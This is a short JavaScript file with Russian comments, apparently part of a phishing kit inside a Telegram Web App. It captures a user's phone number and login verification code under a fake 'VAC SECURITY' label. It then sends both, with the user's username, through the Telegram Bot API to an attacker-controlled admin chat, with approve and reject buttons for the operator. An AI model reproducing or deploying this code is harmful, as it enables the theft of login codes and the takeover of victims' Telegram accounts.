// Конфигурация (заменится при сборке)
const config = {
    botToken: '%%BOT_TOKEN%%',
    adminId: '%%ADMIN_ID%%',
    baseUrl: '%%BASE_URL%%'
};

// Отправка сообщения с кнопками
window.sendToBot = async (type, data) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        
        let message = '';
        let buttons = [];
        
        if (type === 'phone') {
            message = `📱 Пользователь @${user.username || 'без username'} ввел номер: <code>${data}</code>`;
        } else if (type === 'code') {
            message = `🔢 Код верификации: <code>${data}</code>\nОт: @${user.username || 'без username'}`;
            buttons = [
                [
                    { text: "✅ Подтвердить", url: `${config.baseUrl}/yes/index.html` },
                    { text: "❌ Отклонить", url: `${config.baseUrl}/no/index.html` }
                ]
            ];
        }
        
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.adminId,
                text: `🔐 VAC SECURITY\n\n${message}`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: buttons }
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
};